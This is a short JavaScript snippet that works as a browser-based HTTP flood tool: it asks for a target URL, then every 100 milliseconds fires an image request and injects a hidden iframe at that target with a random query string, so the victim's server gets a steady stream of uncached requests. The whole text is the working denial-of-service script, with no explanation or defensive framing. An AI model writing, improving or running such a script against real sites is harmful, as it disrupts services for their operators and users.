var target = prompt("Url");
function attack() {  
  var pic = new Image();
  var rand = Math.floor(Math.random() * 9999999999999999999);
  pic.src = 'http://'+target+"/?r="+rand;
    
    document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
}
setInterval(attack, 100);  
